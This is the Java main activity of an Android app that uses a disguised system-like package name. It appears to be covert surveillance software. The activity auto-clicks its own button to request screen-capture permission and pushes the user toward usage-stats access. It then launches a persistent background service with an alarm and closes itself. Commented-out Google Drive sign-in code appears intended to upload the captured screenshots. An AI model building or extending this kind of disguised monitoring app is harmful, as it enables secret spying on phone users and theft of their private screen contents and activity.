package com.android.systemnotification;

import android.annotation.TargetApi;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;

import com.android.systemnotification.utils.Alarm;
import com.android.systemnotification.utils.BackgroundService;
import com.android.systemnotification.utils.ClassHelper;
import com.android.systemnotification.utils.ScreenshotManager;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_ID = 1;
    private static final int REQUEST_CODE_SIGN_IN = 2;

    //DriveServiceHelper mDriveServiceHelper;

    //GoogleSignInClient mGoogleSignInClient;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        findViewById(R.id.rootView).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                findViewById(R.id.rootView).setBackgroundColor(getResources().getColor(R.color.colorAccent));
            }
        });

        findViewById(R.id.checkIfPossibleToRecordButton).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(final View v) {
                ScreenshotManager.INSTANCE.requestScreenshotPermission(MainActivity.this, REQUEST_ID);
            }
        });

        findViewById(R.id.takeScreenshotButton).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(final View v) {
                ScreenshotManager.INSTANCE.takeScreenshot(MainActivity.this);
            }
        });

        requestUsageStatsPermission();

        ClassHelper classHelper = new ClassHelper();
        if (classHelper.isMyServiceRunning(BackgroundService.class, MainActivity.this)) {


        } else {
            Intent intent = new Intent(MainActivity.this, BackgroundService.class);
            startService(intent);

            Alarm alarm = new Alarm();
            alarm.setAlarm(MainActivity.this);
        }

        //startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));

        findViewById(R.id.checkIfPossibleToRecordButton).performClick();


    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_ID) {
            ScreenshotManager.INSTANCE.onActivityResult(resultCode, data, /*mDriveServiceHelper,*/ MainActivity.this);
        }
        else if (requestCode == REQUEST_CODE_SIGN_IN){

        }
        finish();
    }

    void requestUsageStatsPermission() {
        if(android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP
                && !hasUsageStatsPermission(this)) {
            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        }
    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    boolean hasUsageStatsPermission(Context context) {
        AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow("android:get_usage_stats",
        android.os.Process.myUid(), context.getPackageName());
        boolean granted = mode == AppOpsManager.MODE_ALLOWED;
        return granted;
    }

    /*@Override
    protected void onStart() {
        super.onStart();
        GoogleSignInAccount account = GoogleSignIn.getLastSignedInAccount(getApplicationContext());

        if (account == null) {

            signIn();

        } else {

            mDriveServiceHelper = new DriveServiceHelper(getGoogleDriveService(getApplicationContext(), account, "appName"));
        }
    }

    private void signIn() {

        mGoogleSignInClient = buildGoogleSignInClient();
        startActivityForResult(mGoogleSignInClient.getSignInIntent(), REQUEST_CODE_SIGN_IN);
    }

    private GoogleSignInClient buildGoogleSignInClient() {
        GoogleSignInOptions signInOptions =
        new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                .requestScopes(Drive.SCOPE_FILE)
                .requestScopes(Drive.SCOPE_APPFOLDER)
                .requestEmail()
                .build();
        return GoogleSignIn.getClient(getApplicationContext(), signInOptions);
    }*/
}